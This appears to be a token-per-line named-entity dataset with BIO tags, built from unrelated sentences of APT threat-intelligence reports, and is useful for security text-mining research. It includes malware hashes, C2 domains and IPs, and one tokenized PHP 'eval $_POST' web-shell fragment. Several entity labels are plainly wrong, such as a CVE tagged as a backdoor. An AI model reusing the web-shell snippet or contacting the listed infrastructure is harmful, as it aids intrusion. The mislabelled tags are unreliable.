malware	O
can	O
steal	O
and	O
send	O
sensitive	O
information	O
to	O
the	O
attackers	O
like	O
keystrokes	O
,	O
opened	O
applications	O
,	O
web	O
browsing	O
history	O
,	O
usernames/passwords	O
,	O
upload	O
Desktop	O
screen	O
shots	O
etc	O
.	O

이	O
로써	O
오퍼레이션	O
블랙	O
마인은	O
안다리엘	O
그룹과	O
연관되었다고	O
추정할	O
수	O
있다	O
.	O

We	O
can	O
not	O
exclude	O
that	O
the	O
APT	O
group	O
developed	O
the	O
backdoor	O
to	O
target	O
specific	O
organizations	O
including	O
the	O
Italian	O
Marina	O
Militare	O
or	O
any	O
other	O
subcontractor	O
.	O

php.\@eval	O
[	O
(	O
]	O
\	O
$	O
_POST	O
.	O

Nonetheless	O
,	O
further	O
evidence	O
to	O
connect	O
together	O
the	O
pieces	O
of	O
this	O
attack	O
is	O
needed	O
,	O
as	O
well	O
as	O
insights	O
into	O
the	O
end-goal	O
of	O
the	O
culprits	O
.	O

First	O
is	O
the	O
'	O
ph2	O
,	O
'	O
which	O
could	O
mean	O
'	O
ph	O
'	O
for	O
Philippines	O
and	O
'	O
2	O
'	O
as	O
its	O
second	O
directory	O
of	O
decoy	O
documents	O
.	O

The	O
four	O
exported	O
libraries	O
show	O
that	O
the	O
malware	O
has	O
started	O
to	O
support	O
the	O
OLE	O
Component	O
Object	O
Model	O
(	O
COM	O
)	O
.	O

Figure	O
5	O
:	O

The	O
document	O
is	O
classified	O
as	O
TLP	O
:	O
WHITE	O
,	O
therefore	O
CIRCL	O
encourages	O
everyone	O
to	O
share	O
this	O
analysis	O
report	O
as-is	O
without	O
modification	O
.	O

The	O
algorithm	O
used	O
for	O
encryption	O
and	O
decryption	O
is	O
RSA	O
,	O
which	O
leverages	O
the	O
public	O
and	O
private	O
key	O
exponents	O
included	O
in	O
Section	O
1	O
of	O
the	O
PowerShell	O
script	O
.	O

The	O
majority	O
of	O
the	O
malicious	O
documents	O
crafted	O
by	O
the	O
malware	O
author	O
are	O
Microsoft	O
Office	O
Word	O
documents	O
.	O

Upon	O
executing	O
one	O
particular	O
sample	O
(	O
45142b17abd8a17a5e38305b718f3415	O
)	O
,	O
the	O
malware	O
beacons	O
to	O
'	O
test.cable-modem.org	O
'	O
and	O
'	O
idf.blogsite.org	O
'	O
.	O

It	O
will	O
first	O
attempt	O
to	O
communicate	O
to	O
fighthard.mooo.com	B-url.unknown
using	O
the	O
poison	O
ivy	O
binary	O
protocol	O
with	O
the	O
default	O
connection	O
password	O
of	O
'	O
admin	O
'	O
.	O

This	O
ongoing	O
campaign	O
,	O
which	O
targets	O
universities	O
for	O
scientific	O
and	O
technological	O
intellectual	O
property	O
theft	O
,	O
demonstrates	O
a	O
fundamental	O
lack	O
of	O
trust	O
in	O
the	O
international	O
agreements	O
,	O
including	O
the	O
Joint	O
Comprehensive	O
Plan	O
of	O
Action	O
(	O
JCPOA	O
)	O
.	O

In	O
the	O
middle	O
to	O
late	O
period	O
we	O
have	O
discovered	O
its	O
evolution	O
and	O
two	O
different	O
types	O
of	O
backdoor	O
programs	O
.	O

Some	O
of	O
these	O
tasks	O
include	O
legitimate	O
Adobe	O
services	O
The	O
new	O
win32shell.bat	O
script	O
is	O
subsequently	O
scheduled	O
to	O
run	O
as	O
a	O
task	O
under	O
the	O
'	O
Adobe	O
Flash	O
Updates	O
'	O
name	O
every	O
other	O
day	O
at	O
3	O
AM	O
with	O
the	O
'	O
down	O
'	O
parameter	O
.	O

Google	O
Apps	O
allows	O
organizations	O
to	O
use	O
Gmail	O
as	O
their	O
organizational	O
mail	O
solution	O
.	O

CSRI	O
was	O
also	O
observed	O
in	O
a	O
large	O
number	O
of	O
events	O
dispatching	O
the	O
Parsijoo	O
bot	O
to	O
crawl	O
websites	O
of	O
interest	O
.	O

Screenshot	O
of	O
the	O
final	O
payload	O
to	O
be	O
sent	O
to	O
C	O
&	O
C	O
server	O
.	O

-Jeong	O
Wook	O
Oh	O
MMPC	O

Once	O
a	O
foothold	O
is	O
established	O
,	O
the	O
attackers	O
use	O
PsExec	O
,	O
Remcom	O
,	O
and	O
SMB	O
hacking	O
tools	O
to	O
begin	O
moving	O
across	O
the	O
victim	O
's	O
network	O
.	O

Prepare	O
an	O
incident	O
response	O
plan	O
that	O
can	O
be	O
rapidly	O
implemented	O
in	O
case	O
of	O
a	O
cyber	O
intrusion	O
.	O

The	O
DragonOK	B-malware.infosteal
group	O
was	O
observed	O
hosting	O
their	O
backend	O
HTRAN	O
servers	O
in	O
Jiangsu	O
.	O

Instead	O
of	O
just	O
one	O
new	O
variant	O
,	O
we	O
discovered	O
four	O
different	O
versions	O
of	O
ANEL	B-malware.backdoor
:	O
5.0.0	O
beta1	O
5.1.1	O
rc	O
5.1.2	O
rc1	O
5.2.0	O
rev1	O
The	O
different	O
versions	O
contain	O
changes	O
in	O
the	O
ANEL	B-malware.backdoor
loader	O
and	O
the	O
main	O
ANEL	B-malware.backdoor
DLL	O
.	O

Offset	O
in	O
the	O
Description	O
packet	O

4	O
.	O

Either	O
way	O
,	O
the	O
contents	O
continued	O
to	O
be	O
actively	O
used	O
.	O

https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=27000	O

SHA256	O
Hash	O
eff78c23790ee834f773569b52cddb01dc3c4dd9660f5a476af044ef6fe73894	B-hash
Filename	O
na.doc	O
Targeted	O
Region	O
Pakistan	O
76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338	B-hash
Invest	O
in	O
Turkey.doc	O
Turkey	O
6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac	B-hash
güvenlik	O
yönergesi	O
.	O

All	O
rights	O
reserved	O
.	O

REFERENCES	O

Actors	O
went	O
to	O
great	O
lengths	O
to	O
make	O
the	O
malware	O
efficient	O
and	O
effective	O
while	O
building	O
in	O
obfuscation	O
and	O
complexity	O
.	O

Based	O
on	O
the	O
file	O
creation	O
timestamps	O
as	O
well	O
as	O
the	O
app	O
signing	O
process	O
,	O
which	O
occurred	O
on	O
28	O
March	O
2013	O
,	O
CrowdStrike	O
has	O
determined	O
that	O
the	O
app	O
was	O
developed	O
sometime	O
between	O
20	O
February	O
and	O
13	O
April	O
2013	O
.	O

The	O
new	O
wave	O
of	O
attacks	O
included	O
a	O
new	O
generation	O
of	O
USB	B-malware.infosteal
stealers	I-malware.infosteal
deployed	O
by	O
Sofacy	O
,	O
with	O
initial	O
versions	O
dating	O
to	O
February	O
2015	O
.	O

Some	O
of	O
the	O
techniques	O
might	O
have	O
also	O
an	O
impact	O
on	O
the	O
interpretation	O
of	O
the	O
malware	O
.	O

Command	O
Description	O
number	O

Figure	O
4	O
.	O

Build	O
Date	O
[	O
Mon	O
Jun	O
10	O
18:51:48	O
2013	O
UTC	O
]	O
Comments	O
This	O
installation	O
was	O
built	O
with	O
Inno	O
Setup	O
.	O

At	O
the	O
bottom	O
of	O
several	O
of	O
the	O
pages	O
for	O
the	O
People	O
Power	O
website	O
are	O
four	O
iFrames	O
as	O
seen	O
in	O
this	O
screen	O
shot	O
of	O
the	O
website	O
source	O
:	O
Those	O
links	O
,	O
with	O
the	O
exception	O
of	O
the	O
first	O
one	O
,	O
all	O
redirect	O
to	O
exploit	O
pages	O
on	O
the	O
Hong	O
Kong	O
IP	O
address	O
58.64.178.77	B-ip.unknown
.	O

Finally	O
,	O
and	O
of	O
most	O
interest	O
in	O
this	O
diagram	O
,	O
the	O
central	O
node	O
at	O
the	O
bottom	O
of	O
the	O
diagram	O
,	O
represents	O
the	O
Command	O
and	O
Control	O
node	O
(	O
184.22.201[.]27	B-ip.unknown
)	O
used	O
by	O
these	O
two	O
examples	O
.	O

1/10	O

The	O
sample	O
also	O
looks	O
for	O
a	O
file	O
named	O
i4.dt	O
in	O
the	O
same	O
directory	O
and	O
extracts	O
the	O
contents	O
of	O
it	O
,	O
renames	O
the	O
file	O
to	O
icone.vbs	O
,	O
and	O
creates	O
a	O
new	O
persistent	O
key	O
(	O
Figure	O
9	O
)	O
contents	O
of	O
it	O
,	O
renames	O
the	O
file	O
to	O
icone.vbs	O
,	O
and	O
creates	O
a	O
new	O
persistent	O
key	O
(	O
Figure	O
9	O
)	O
in	O
\Software\Microsoft\Windows\CurrentVersion\Run	O
to	O
open	O
this	O
file	O
.	O

Size	O
Complie	O
Time	O
Import	O
Hash	O
f9cfda6062a8ac9e332186a7ec0e706a	B-hash
49152	O
bytes	O
2014-08-25	O
02:10:11	O
864cd776c24a3c653fd89899ca32fe0b	B-hash

Also	O
of	O
particular	O
interest	O
from	O
an	O
attribution	O
obfuscation	O
perspective	O
is	O
direct	O
IP	O
crossover	O
with	O
previous	O
Dynamic	O
DNS	O
domains	O
associated	O
with	O
known	O
CN-APT	O
activity	O
.	O

If	O
successful	O
,	O
it	O
sends	O
a	O
request	O
to	O
hxxp://api-api[.]com/jsonin	B-url.unknown
order	O
to	O
detect	O
the	O
external	O
IP	O
of	O
the	O
victim	O
.	O

Enforce	O
a	O
tiered	O
administrative	O
model	O
with	O
dedicated	O
administrator	O
workstations	O
and	O
separate	O
administrative	O
accounts	O
that	O
are	O
used	O
exclusively	O
for	O
each	O
tier	O
to	O
prevent	O
tools	O
,	O
such	O
as	O
Mimikatz	O
,	O
for	O
credential	O
theft	O
from	O
harvesting	O
domain-level	O
credentials	O
.	O

Also	O
the	O
size	O
of	O
the	O
malicious	O
PDF	O
is	O
significantly	O
smaller	O
than	O
the	O
non­malicious	O
version	O
.	O

putty.exe	O
(	O
a	O
windows	O
SSH	O
client	O
)	O
filezilla.exe	O
(	O
supports	O
ftps	O
uploads	O
)	O
winscp.exe	O
(	O
a	O
windows	O
secure	O
copy	O
application	O
,	O
providing	O
encrypted	O
and	O
secure	O
file	O
transfer	O
)	O
mstsc.exe	O
(	O
Windows	O
Remote	O
Desktop	O
client	O
,	O
providing	O
an	O
encrypted	O
connection	O
to	O
remote	O
systems	O
)	O
mRemoteNG.exe	O
(	O
a	O
remote	O
connections	O
manager	O
supporting	O
SSH	O
,	O
RDP	O
,	O
and	O
other	O
encrypted	O
protocols	O
)	O
Also	O
included	O
in	O
StrongPity	O
components	O
are	O
keyloggers	O
and	O
additional	O
data	O
stealers	O
.	O

The	O
malware	O
monitors	O
SWIFT	O
Financial	O
Application	O
(	O
FIN	O
)	O
messages	O
,	O
by	O
parsing	O
the	O
contents	O
of	O
the	O
files	O
*.prc	O
and	O

To	O
lure	O
the	O
victims	O
to	O
open	O
the	O
malicious	O
attachment	O
the	O
email	O
subject	O
relevant	O
to	O
the	O
victims	O
were	O
chosen	O
and	O
to	O
avoid	O
suspicion	O
the	O
email	O
was	O
made	O
to	O
look	O
like	O
it	O
was	O
sent	O
by	O
a	O
person	O
associated	O
with	O
IDSA	O
asking	O
to	O
take	O
action	O
against	O
a	O
pending	O
case	O
as	O
shown	O
in	O
the	O
screen	O
shot	O
below	O
.	O

These	O
data	O
will	O
be	O
later	O
used	O
in	O
the	O
C	O
&	O
C	O
communication	O
,	O
as	O
shown	O
in	O
the	O
Wireshark	O
screenshot	O
below	O
.	O

Two	O
different	O
contractors	O
(	O
or	O
more	O
)	O
are	O
typically	O
required	O
to	O
complete	O
the	O
government-defined	O
objective	O
.	O

The	O
malware	O
used	O
in	O
these	O
attacks	O
employs	O
a	O
number	O
of	O
interesting	O
techniques	O
to	O
'	O
hide	O
in	O
plain	O
sight	O
'	O
and	O
to	O
evade	O
dynamic	O
malware	O
analysis	O
systems	O
.	O

Compromised	O
site	O

'	O
User­Agent	O
:	O
'	O
;	O
http_header	O
;	O
content	O
:	O
!	O

--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
-New	O
Session	O
:	O
%	O
fully	O
qualified	O
computer	O
name	O
%	O
%	O
timestamp	O
%	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O

The	O
attack	O
group	O
'	O
Moafee	B-malware.infosteal
'	O
(	O
named	O
after	O
their	O
command	O
and	O
control	O
infrastructure	O
)	O
appears	O
to	O
operate	O
out	O
of	O
the	O
Guangdong	O
province	O
in	O
China	O
and	O
is	O
known	O
to	O
target	O
the	O
governments	O
and	O
military	O
organizations	O
of	O
countries	O
with	O
national	O
interests	O
in	O
the	O
South	O
China	O
Sea	O
.	O

It	O
should	O
be	O
noted	O
that	O
the	O
image	O
requested	O
using	O
the	O
link	O
is	O
not	O
physically	O
located	O
on	O
the	O
remote	O
server	O
.	O

In	O
this	O
blog	O
post	O
we	O
'll	O
analyze	O
two	O
specific	O
incidents	O
apparently	O
targeting	O
victims	O
in	O
Vietnam	O
and	O
in	O
India	O
and	O
we	O
'll	O
describe	O
the	O
capabilities	O
of	O
the	O
custom	O
backdoor	O
being	O
used	O
that	O
for	O
convenience	O
(	O
and	O
to	O
our	O
knowledge	O
,	O
for	O
a	O
lack	O
of	O
an	O
existing	O
name	O
)	O
we	O
call	O
KeyBoy	B-malware.backdoor
,	O
due	O
to	O
a	O
string	O
present	O
in	O
one	O
of	O
the	O
samples	O
.	O

Unfortunately	O
,	O
this	O
file	O
was	O
no	O
longer	O
hosted	O
at	O
tk-in-f156.2bunny[.]com	B-url.unknown
for	O
further	O
analysis	O
.	O

(	O
e.g	O
,	O
this	O
technique	O
was	O
used	O
to	O
compromise	O
and	O
infect	O
visitors	O
to	O
numerous	O
Polish	O
Government	O
websites	O
in	O
2014	O
)	O
.	O

We	O
have	O
learned	O
of	O
more	O
than	O
150	O
targets	O
in	O
these	O
countries	O
when	O
investigating	O
a	O
breached	O
email	O
account	O
used	O
by	O
the	O
attackers	O
to	O
send	O
further	O
malicious	O
emails	O
.	O

The	O
first	O
time	O
the	O
client	O
connects	O
to	O
the	O
server	O
,	O
a	O
UUID	O
is	O
returned	O
and	O
used	O
as	O
a	O
session	O
ID	O
.	O

The	O
protection	O
is	O
enabled	O
to	O
all	O
processes	O
except	O
for	O
ones	O
in	O
the	O
following	O
list	O
:	O
Svchost.exe	O
,	O
Lsass.exe	O
,	O
Winlogon.exe	O
,	O
Services.exe	O
,	O
Csrss.exe	O
,	O
ctfmon.exe	O
,	O
Rundll32.exe	O
,	O
mpnotify.exe	O
,	O
update.exe	O
.	O

T	O
he	O
initial	O
module	O
drops	O
three	O
files	O
that	O
are	O
typical	O
for	O
Chinese-speaking	O
actors	O
:	O
a	O
legit	O
Symantec	O
pcAnywhere	O
(	O
IntgStat.exe	O
)	O
for	O
DLL	O
side	O
loading	O
,	O
a	O
.dll	O
launcher	O
(	O
pcalocalresloader.dll	O
)	O
and	O
the	O
last-stage	O
decompressor	O
(	O
thumb.db	O
)	O
.	O

APT19	B-malware.infosteal
phishing	O
emails	O
from	O
this	O
campaign	O
originated	O
from	O
sender	O
email	O
accounts	O
from	O
the	O
'	O
@	O
cloudsend[.]net	O
'	O
domain	O
and	O
used	O
a	O
variety	O
of	O
subjects	O
and	O
attachment	O
names	O
.	O

netname	O
inetnum_start	O
inetnum_end	O
country	O
mnt-by	O
created	O

A	O
200.63.46.23	B-ip.unknown
6	O
news.grouptumbler.com	B-url.unknown
.	O

Note	O
:	O
these	O
fi	O
les	O
are	O
specifi	O
c	O
to	O
the	O
sample	O
we	O
analyzed	O
at	O
HBGary	O
,	O
Inc	O
.	O

The	O
64kb	O
lnk	O
file	O
is	O
downloader	O
code	O
:	O
When	O
this	O
lnk	O
file	O
is	O
executed	O
,	O
it	O
begins	O
an	O
AJAX-based	O
download	O
process	O
for	O
the	O
'	O
unzip.js	O
'	O
file	O
(	O
a07124b65a76ee7d721d746fd8047066	O
)	O
on	O
openofficev.info	O
.	O

true-crypt[.]com	B-url.unknown
malicious	O
StrongPity	O
distribution	O
site	O

We	O
infer	O
that	O
from	O
the	O
point	O
of	O
view	O
of	O
these	O
attackers	O
,	O
not	O
all	O
attacks	O
need	O
to	O
have	O
sophisticated	O
malware	O
in	O
order	O
to	O
be	O
successful	O
enough	O
to	O
be	O
worth	O
doing	O
.	O

We	O
identified	O
a	O
new	O
variant	O
used	O
in	O
July	O
2017	O
named	O
G2	O
.	O

Given	O
the	O
sophistication	O
of	O
the	O
code	O
and	O
how	O
well	O
the	O
operation	O
was	O
executed	O
,	O
we	O
have	O
concluded	O
that	O
those	O
carrying	O
it	O
out	O
have	O
previous	O
field	O
experience	O
.	O

Once	O
the	O
infection	O
happens	O
,	O
it	O
reports	O
to	O
the	O
command	O
and	O
control	O
servers	O
before	O
beginning	O
a	O
complex	O
lateral	O
movement	O
phase	O
.	O

Since	O
2014	O
,	O
Symantec	O
has	O
found	O
evidence	O
of	O
a	O
steady	O
stream	O
of	O
attacks	O
from	O
the	O
Inception	B-malware.backdoor
Framework	I-malware.backdoor
targeted	O
at	O
organizations	O
on	O
several	O
continents	O
.	O

The	O
number	O
of	O
active	O
connections	O
displayed	O
on	O
the	O
Connections	O
tab	O
grid	O
status	O
bar	O
is	O
incremented	O
by	O
1	O
.	O

The	O
group	O
mounted	O
cyberattacks	O
against	O
various	O
computer	O
systems	O
in	O
Ukraine	O
;	O
systems	O
that	O
can	O
be	O
defined	O
as	O
critical	O
infrastructure	O
.	O

Figure	O
1	O
:	O
Client	O
binary	O
viewed	O
in	O
WinHex	O

Using	O
the	O
leaked	O
HackingTeam	O
source	O
code	O
:	O

2016	O
.	O

Otherwise	O
,	O
the	O
loop	O
will	O
inspect	O
another	O
internal	O
flag	O

2016	O
.	O

25	O
July	O
2016	O
.	O

This	O
volume	O
of	O
traffic	O
is	O
likely	O
to	O
represent	O
a	O
noisy	O
scanning	O
research	O
attempt	O
and	O
not	O
someone	O
DoS'ing	O
the	O
site	O
:	O
Recorded	O
site	O
visits	O
following	O
the	O
9th	O
are	O
likely	O
to	O
be	O
unreliable	O
and	O
may	O
be	O
more	O
researchers	O
,	O
responding	O
to	O
the	O
growing	O
notoriety	O
of	O
the	O
site	O
following	O
the	O
public	O
reports	O
on	O
the	O
9th	O
.	O

Nevertheless	O
,	O
it	O
is	O
not	O
entirely	O
clear	O
how	O
and	O
when	O
the	O
attackers	O
choose	O
to	O
use	O
the	O
RAT	B-malware.backdoor
or	O
the	O
rootkit	B-malware.backdoor
or	O
whether	O
both	O
are	O
used	O
in	O
parallel	O
.	O

Government	O
entities	O
,	O
including	O
the	O
Central	O
Asian	O
ones	O
also	O
were	O
a	O
target	O
for	O
this	O
actor	O
before	O
.	O

Each	O
polling	O
attempt	O
starts	O
from	O
a	O
state	O

It	O
is	O
possible	O
to	O
have	O
more	O
than	O
one	O
tunnel	O
active	O
at	O
any	O
given	O
time	O
.	O

Both	O
of	O
these	O
features	O
are	O
noteworthy	O
and	O
may	O
provide	O
the	O
ability	O
to	O
correlate	O
future	O
tools	O
to	O
the	O
same	O
group	O
and/or	O
malware	O
authors	O
.	O

The	O
malware	O
displays	O
a	O
picture	O
as	O
expected	O
.	O

Checks	O
if	O
process	O
is	O
running	O
in	O
a	O
virtualized	O
environment	O
.	O

There	O
is	O
also	O
evidence	O
that	O
it	O
attempted	O
to	O
attack	O
a	O
major	O
international	O
travel	O
reservations	O
 rm	O
.	O

The	O
first	O
two	O
hexadecimal	O
bytes	O
of	O
the	O
payload	O
data	O
are	O
0x9B	O
0x8A	O
,	O
but	O
they	O
should	O
start	O
with	O
0x4D	O
0x5A	O
,	O
the	O
bytes	O
for	O
the	O
ASCII	O
characters	O
'	O
MZ	O
'	O
.	O

ct.datangcun[.]20120509_CT	B-url.cncsvr
V2.1	O

Keywords	O
:	O
advanced	O
persistent	O
threat	O
;	O
cyber	O
attack	O
;	O
Dark	O
Seoul	O
;	O
defense	O
;	O
malware	O
analysis	O
;	O

The	O
vast	O
majority	O
of	O
the	O
submissions	O
come	O
from	O
big	O
organizations	O
such	O
as	O
Antivirus	O
companies	O
.	O

(	O
185.99.32.0/22	B-ip.unknown
,	O
78.40.183.0/24	B-ip.unknown
)	O
One	O
of	O
the	O
fake	O
Facebook	O
profile	O
's	O
likes	O
are	O
also	O
interesting	O
,	O
and	O
if	O
any	O
of	O
the	O
victims	O
had	O
taken	O
a	O
closer	O
look	O
at	O
these	O
,	O
they	O
may	O
not	O
have	O
fallen	O
for	O
the	O
scam	O
.	O

With	O
services	O
that	O
include	O
strategy	O
and	O
risk	O
management	O
,	O
cyber	O
defense	O
,	O
digital	O
identity	O
,	O
application	O
security	O
and	O
managed	O
security	O
,	O
Accenture	O
enables	O
businesses	O
around	O
the	O
world	O
to	O
defend	O
against	O
known	O
sophisticated	O
threats	O
,	O
and	O
the	O
unknown	O
.	O

This	O
short	O
paper	O
outlines	O
our	O
current	O
perspectives	O
on	O
the	O
previously	O
discussed	O
espionage	O
groups	O
currently	O
using	O
the	O
framework	O
and	O
a	O
hint	O
that	O
a	O
5	O
player	O
is	O
getting	O
in	O
on	O
the	O
game	O
.	O

OMPARISON	O
OF	O
DISASSEMBLING	O
COMMANDS	O
OF	O
MODULE	O
...........................................................................	O
9	O

After	O
understanding	O
the	O
logic	O
(	O
logic	O
is	O
mentioned	O
below	O
)	O
&	O
to	O
satisfy	O
the	O
condition	O
the	O
environment	O
was	O
configured	O
to	O
give	O
proper	O
response	O
whenever	O
the	O
malware	O
made	O
a	O
request	O
to	O
Jobwork1.php	O
or	O
Jobwork2.php	O
.	O

This	O
paper	O
highlights	O
many	O
of	O
these	O
techniques	O
and	O
how	O
we	O
were	O
able	O
to	O
bypass	O
them	O
.	O

A	O
campaign	O
masquerading	O
as	O
a	O
call	O
to	O
arms	O
by	O
a	O
pro-opposition	O
cleric	O
.	O

Just	O
because	O
the	O
boot	O
sector	O
of	O
the	O
VBR	O
is	O
recoverable	O
does	O
n't	O
mean	O
that	O
everything	O
on	O
the	O
file	O
system	O
will	O
be	O
restored	O
to	O
normal	O
.	O

2	O
.	O

Several	O
hours	O
later	O
,	O
a	O
dropper	O
would	O
appear	O
on	O
the	O
compromised	O
computer	O
.	O

2/10	O
It	O
sets	O
the	O
value	O
of	O
'	O
BITSRAN	B-malware.drop
'	O
to	O
point	O
to	O
the	O
executable	O
in	O
the	O
Temp	O
location	O
above	O
.	O

This	O
DecryptResources_sub_49F92C	O
(	O
)	O
function	O
actually	O
decrypts	O
a	O
lot	O
of	O
encrypted	O
bot	O
parameters	O
stored	O
in	O
various	O
resources	O
;	O
some	O
of	O
the	O
more	O
interesting	O
ones	O
are	O
as	O
follows	O
:	O

The	O
app	O
was	O
created	O
to	O
test	O
the	O
library	O
injection	O
.	O

A	O
call	O
to	O
a	O
hooked	O
API	O
then	O
results	O
in	O
the	O
calling	O
application	O
invoking	O
a	O
trampoline	O
function	O
,	O
which	O
performs	O
malicious	O
activity	O
and	O
then	O
passes	O
control	O
on	O
to	O
the	O
legitimate	O
API	O
.	O

Server	O
Uranio3	O

Blog	O
,	O
[	O
online	O
]	O
19	O
March	O
2013	O
,	O
Available	O
:	O
https://blog.avast.com/2013/03/19/analysis-of-chinese-attack-against-korean-banks/	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
J.	O
Schwartz	O
,	O
'	O
South	O
Korea	O
Changes	O
Story	O
On	O
Bank	O
Hacks	O
,	O
'	O
Information	O
Week	O
[	O
online	O
]	O
22	O
March	O
2013	O
,	O
Available	O
:	O
http://www.informationweek.com/security/attacks/south-korea-changes-story-on-bank-hacks/240151542	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
'	O
Remote	O
Linux	O
Wiper	O
Found	O
in	O
South	O
Korean	O
Cyber	O
Attack	O
,	O
'	O
Symantec	O
Connect	O
[	O
online	O
]	O
20	O
March	O
2013	O
,	O
Available	O
:	O
http://www.symantec.com/connect/blogs/remote-linux-wiper-found-south-korean-cyber-attack	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
'	O
Trojan.Jokra	B-malware.unknown
,	O
'	O
Symantec	O
Security	O
Response	O
,	O
[	O
online	O
]	O
27	O
March	O
2013	O
,	O
http://www.symantec.com/security_response/writeup.jsp?docid=2013-032014-2531-99	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
'	O
CVE-2012-1889	B-malware.backdoor
,	O
'	O
Common	O
Vulnerabilities	O
and	O
Exposures	O
,	O
[	O
online	O
]	O
22	O
March	O
2012	O
,	O
Available	O
:	O
http://www.cve.mitre.org/cgibin/cvename.cgi?name=CVE-2012-1889	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
Metasploit	O
,	O
'	O
Microsoft	O
XML	O
Core	O
Services	O
MSXML	O
Uninitialized	O
Memory	O
Corruption	O
,	O
'	O
The	O
Exploit	O
Database	O
,	O
[	O
online	O
]	O
http://www.exploit-db.com/exploits/19186/	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
J.	O
Blasco	O
,	O
'	O
A	O
theory	O
on	O
the	O
South	O
Korean	O
attacks	O
,	O
'	O
Alien	O
Vault	O
Labs	O
[	O
online	O
]	O
20	O
March	O
2013	O
,	O
Available	O
:	O
http://labs.alienvault.com/labs/index.php/2013/a-theory-on-the-south-korean-attacks/	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
'	O
Trojan.Jokra	B-malware.unknown
,	O
'	O
Symantec	O
Security	O
Response	O
,	O
[	O
online	O
]	O
27	O
March	O
2013	O
,	O
http://www.symantec.com/security_response/writeup.jsp?docid=2013-032014-2531-99&tabid=2	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
G	O
.	O

Uranio	O
Sinkhole	O
Analysis	O

Analyses	O
of	O
multiple	O
customized	O
malware	O
binaries	O
hosted	O
within	O
a	O
small	O
U.S.	O
subnet	O
have	O
likely	O
been	O
used	O
to	O
target	O
Indian	O
military	O
or	O
government	O
entities	O
.	O

Initial	O
response	O
from	O
the	O
command	O
and	O
control	O
server	O
After	O
the	O
check	O
,	O
the	O
malware	O
gets	O
the	O
following	O
system	O
information	O
,	O
which	O
it	O
sends	O
to	O
the	O
C	O
&	O
C	O
via	O
an	O
HTTP	O
POST	O
request	O
:	O
·	O
User	O
name	O
,	O
Computer	O
Name	O
,	O
OS	O
,	O
and	O
CPU	O
information	O
Fig	O
8	O
.	O

Use	O
of	O
Malware	O
that	O
sleeps	O
for	O
long	O
time	O
without	O
generating	O
any	O
network	O
activity	O
(	O
to	O
evade	O
sandbox	O
analysis	O
)	O
Use	O
of	O
hosting	O
provider	O
to	O
host	O
C2	O
infrastructure	O

@	O
@	O
sernum1	O
getres	O
@	O
@	O
sernum2	O
ferry	O
1	O
@	O
@	O
00	O
dir	O
4	O

During	O
our	O
analysis	O
,	O
we	O
also	O
discovered	O
that	O
our	O
customer	O
was	O
not	O
the	O
only	O
person	O
to	O
encounter	O
the	O
Tempting	B-malware.infosteal
Cedar	I-malware.infosteal
Spyware	I-malware.infosteal
,	O
and	O
,	O
unfortunately	O
,	O
many	O
fell	O
for	O
the	O
trap	O
.	O

The	O
attacker	O
deployed	O
TRITON	B-malware.infosteal
shortly	O
after	O
gaining	O
access	O
to	O
the	O
SIS	O
system	O
,	O
indicating	O
that	O
they	O
had	O
pre-built	O
and	O
tested	O
the	O
tool	O
which	O
would	O
require	O
access	O
to	O
hardware	O
and	O
software	O
that	O
is	O
not	O
widely	O
available	O
.	O

Rampage.freetcp.com	B-url.unknown
still	O
resolves	O
to	O
103.229.125.157	B-ip.unknown
as	O
of	O
4/2/2015	O
Let	O
's	O
go	O
ahead	O
and	O
take	O
a	O
look	O
further	O
into	O
one	O
of	O
the	O
other	O
expoit	O
documents	O
,	O
8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c	B-hash
.	O

Mon	O
,	O
5	O
May	O
2014	O
09:47:22	O
+0600	O
lremit_Transfer_Error_Page.jar	B-malware.infosteal

The	O
malware	O
then	O
forces	O
the	O
computer	O
to	O
restart	O
thus	O
making	O
it	O
unusable	O
.	O

On	O
Sunday	O
August	O
24	O
,	O
2014	O
we	O
observed	O
a	O
spear	O
phish	B-malware.infosteal
email	O
sent	O
to	O
a	O
Taiwanese	O
government	O
ministry	O
.	O

APT12	O
has	O
the	O
ability	O
to	O
adapt	O
quickly	O
to	O
public	O
exposures	O
with	O
new	O
tools	O
,	O
tactics	O
,	O
and	O
procedures	O
(	O
TTPs	O
)	O
.	O

This	O
technology	O
already	O
proved	O
its	O
effectiveness	O
earlier	O
this	O
year	O
,	O
when	O
it	O
caught	O
an	O
Adobe	O
Flash	O
zero	O
day	O
exploit	O
(	O
CVE-2016-1010	O
)	O
.	O

The	O
DLL	O
then	O
constructs	O
a	O
file	O
name	O
that	O
consists	O
of	O
the	O
host	O
process	O
name	O
,	O
formatted	O
as	O
:	O

Facebook	O
Comments	O
Plugin	O

By	O
Email	O

Dmitri	O
Alperovitch	O
There	O
is	O
rarely	O
a	O
dull	O
day	O
at	O
CrowdStrike	O
where	O
we	O
are	O
not	O
detecting	O
or	O
responding	O
to	O
a	O
breach	O
at	O
a	O
company	O
somewhere	O
around	O
the	O
globe	O
.	O

So	O
,	O
which	O
language	O
corresponds	O
to	O
the	O
value	O
1036	O
,	O
or	O
0x40c	O
in	O
hexadecimal	O
?	O

Its	O
filename	O
is	O
also	O
picked	O
from	O
a	O
hardcoded	O
list	O
.	O

'	O
Silence	O
of	O
